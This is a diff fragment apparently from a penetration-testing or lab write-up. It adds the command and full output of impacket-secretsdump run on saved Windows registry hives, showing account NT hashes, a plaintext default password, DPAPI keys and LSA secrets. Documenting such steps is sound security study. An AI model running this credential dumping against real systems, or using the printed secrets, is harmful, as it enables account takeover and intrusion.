@@ -317,3 +317,30 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandato
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
+```sh
+└─$ impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM LOCAL 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:eb2ded57bdb012e813d5a575c79b9da0cfcd40baa4e4ba7243cc855d49adc476834d4e5e3bc18bc07294445df93364ab9608f7adaf165c4072f35913c370a99a0bd3177fcfd468636c6d928bcd7c6d0d6d7452163011ae90c779afd152006cf819bd6eaa0acb020062cfcda8d4b713df62758ebe2b309f9fa45af752b0a12166f23afd4a905e479cd9a7210dac2a7c3d0f65ba8fbbea706500f8797e3dcbbb5b51719db85a4fb25d62d627
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7dc360f8e2e247a701f551f3eec96ce9
+[*] DefaultPassword 
+(Unknown User):###_ADM1N_3920_###
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
+dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
+[*] NL$KM 
+ 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
+ 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
+ 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
+ 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
+NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
+[*] Cleaning up...
+```
